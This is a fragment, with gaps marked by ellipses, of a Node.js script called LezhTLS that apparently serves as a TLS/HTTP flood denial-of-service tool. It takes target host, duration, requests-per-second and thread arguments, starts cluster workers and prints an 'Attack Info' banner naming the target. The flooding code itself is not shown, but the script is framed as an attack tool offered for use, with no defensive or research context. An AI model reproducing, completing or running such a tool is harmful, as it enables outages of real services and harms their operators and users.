...
if (process.argv.length < 5){console.log(`<[/]> node LezhTLS.js <HOST> <TIME> <RPS> <THREADS>.`); process.exit();}
...
if (cluster.isMaster) {
   ...
   console.log(``);
   console.log(``);
   console.log(`<==> LezhTLS <==> Lezhin <==>`);
   console.log(`[©] Copyright : Lezhin />`);
   console.log(`[Ω] Version : 1.2 />`);
   console.log(`--> < Attack Info /> <--`)
   console.log('[#] => Target: ' + parsedTarget.host + `[#]`);
   console.log('[∞] => Time: ' + args.time + `[∞]`);
   console.log('[×] => Threads: ' + args.threads + `[×]`);
   console.log('[Ø] => Requests per second: ' + args.Rate + `[Ø]`);
